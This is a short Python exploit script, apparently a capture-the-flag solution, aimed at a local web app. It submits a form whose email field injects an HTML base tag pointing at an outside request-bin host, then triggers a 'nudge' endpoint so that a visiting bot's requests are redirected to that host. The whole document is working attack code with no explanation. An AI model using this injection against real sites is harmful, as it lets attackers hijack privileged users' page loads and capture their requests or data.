import requests


def create(data):
    response = requests.post(
        f"{BASE_URL}/begg",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=data,
    )

    text = response.text
    i = text.find("/status")
    return text[i + 8 : i + 40]


def report(id):
    response = requests.get(
        f"{BASE_URL}/nudge/{id}",
    )

    return response.text


BASE_URL = "http://localhost:1337"

BIN_URL = "https://abcde.x.pipedream.net"

payload = f'email=<base href="{BIN_URL}">&reason=abcd&user_input=1234'

id = create(payload)

print(report(id))
